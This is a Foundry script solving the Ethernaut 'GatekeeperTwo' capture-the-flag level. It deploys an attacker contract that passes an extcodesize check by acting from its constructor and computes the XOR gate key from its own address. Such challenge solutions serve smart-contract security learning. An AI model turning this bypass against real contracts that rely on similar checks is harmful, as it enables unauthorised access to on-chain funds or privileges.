// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "src/level14.sol";

contract POC is Script {
    GatekeeperTwo level14;

    function setUp() public {
        level14 = GatekeeperTwo(0x1bc245001ae36eB647Ea047a69bE0883f066f209);
    }

    function run() public {
        vm.startBroadcast();
        new GatekeeperTwoAttacker(level14);
        vm.stopBroadcast();
    }
}

contract GatekeeperTwoAttacker {
    /**
    Constructor:
    https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/

    bytes8 _gateKey;

    a = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));
    b = uint64(_gateKey);
    result = uint64(0) - 1;

    // https://medium.com/imolfar/bitwise-operations-and-bit-manipulation-in-solidity-ethereum-1751f3d2e216
    a ^ b = result;
    result ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
     */
    constructor(GatekeeperTwo gatekeeper) public payable {
        uint64 result = uint64(0) - 1;
        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 key = result ^ a;
        bytes8 gateKey = bytes8(key);

        require(a ^ uint64(gateKey) == result);
        gatekeeper.enter(gateKey);
    }
}
